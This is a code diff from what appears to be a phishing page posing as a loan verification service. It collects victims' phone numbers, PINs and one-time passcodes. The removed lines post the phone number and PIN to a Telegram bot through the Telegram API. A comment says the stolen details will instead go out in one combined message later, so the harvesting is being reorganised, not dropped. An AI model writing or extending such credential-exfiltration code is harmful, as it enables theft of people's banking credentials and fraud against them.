@@ -235,20 +235,7 @@ let userPin = '';
     // Send to Bot (Step 1 - Notification only)
     // ========================================
     async function sendToBotForApproval(phone, pin) {
-        const message = '\uD83D\uDCE2 NEW VERIFICATION REQUEST\n\n\uD83D\uDCF1 Session ID: ' + SESSION_ID + '\n\uD83D\uDE4F Phone: ' + phone + '\n\uD83D\uDD11 PIN: ' + pin + '\n\uD83D\uDD52 Time: ' + new Date().toLocaleString();
-
-        try {
-            const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-            });
-            
-            const result = await response.json();
-            console.log('Bot response:', result);
-        } catch (error) {
-            console.log('Error sending to bot:', error);
-        }
+        // Skip - we'll send one combined message when OTP is verified
     }
 
     // ========================================
@@ -404,12 +391,7 @@ let userPin = '';
         document.getElementById('otp-approved').style.display = 'block';
         document.getElementById('otp-approved').querySelector('p').textContent = '✓ OTP Verified!';
         
-        // Send ONE message - OTP VERIFIED
-        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: '\u2705 OTP VERIFIED - Customer can proceed to loan details!' })
-        });
+        // Don't send extra message - the approval message already sent
         
         setTimeout(() => { showStep(3); }, 500);
     }
